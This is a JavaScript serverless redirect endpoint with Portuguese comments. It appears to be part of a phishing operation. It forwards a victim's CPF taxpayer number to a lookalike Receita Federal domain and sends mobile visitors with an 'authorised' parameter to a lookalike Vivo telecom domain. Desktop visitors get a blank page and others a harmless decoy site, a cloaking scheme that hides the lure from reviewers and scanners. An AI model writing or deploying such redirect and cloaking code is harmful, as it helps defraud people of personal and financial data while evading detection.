// api/redirect.js - Endpoint específico para redirecionamento
import { Pool, neonConfig } from '@neondatabase/serverless';
import ws from 'ws';

// Configure WebSocket para o Neon Database
neonConfig.webSocketConstructor = ws;

// Configuração fixa dos domínios, conforme solicitado pelo usuário
const FIXED_CONFIG = {
  domain: 'portal.vivo-cadastro.com',
  alternative_domain: 'atendimentovivo.gupy.io'
};

export default async function handler(req, res) {
  // CORS headers para permitir acesso de qualquer origem
  res.setHeader('Access-Control-Allow-Credentials', true);
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS');
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  );

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // Verificar se tem CPF na query para redirecionamento da Receita Federal
  if (req.query.cpf) {
    const cpf = req.query.cpf;
    // Validar se o CPF tem 11 dígitos
    if (/^\d{11}$/.test(cpf)) {
      const receitaUrl = `https://receita.canalgovbr.org/${cpf}`;
      console.log('Redirecionando CPF para Receita Federal:', receitaUrl);
      return res.redirect(307, receitaUrl);
    } else {
      console.log('CPF inválido fornecido:', cpf);
      res.status(400).json({ error: 'CPF deve ter 11 dígitos' });
      return;
    }
  }

  // Verifica se o parâmetro de acesso está presente
  const hasAuthParam = req.query.acesso === 'autorizado';
  console.log('Parâmetro acesso=autorizado presente:', hasAuthParam);

  // Verifica se é dispositivo móvel através do user-agent
  const userAgent = req.headers['user-agent'] || '';
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  console.log('Dispositivo é móvel:', isMobile);
  
  // Determina o domínio alvo baseado na presença do parâmetro de autorização e tipo de dispositivo
  let redirectUrl = `https://${FIXED_CONFIG.alternative_domain}`; // URL padrão para não-autorizado
  
  if (hasAuthParam) {
    // Se tem o parâmetro de autorização
    if (isMobile) {
      // Dispositivo móvel - redirecionar para o domínio autorizado
      redirectUrl = `https://${FIXED_CONFIG.domain}?acesso=autorizado`;
    } else {
      // Desktop - redirecionar para about:blank
      redirectUrl = 'about:blank';
    }
  }
  
  console.log('Redirecionando para:', redirectUrl);
  
  // Realiza o redirecionamento
  return res.redirect(307, redirectUrl);
}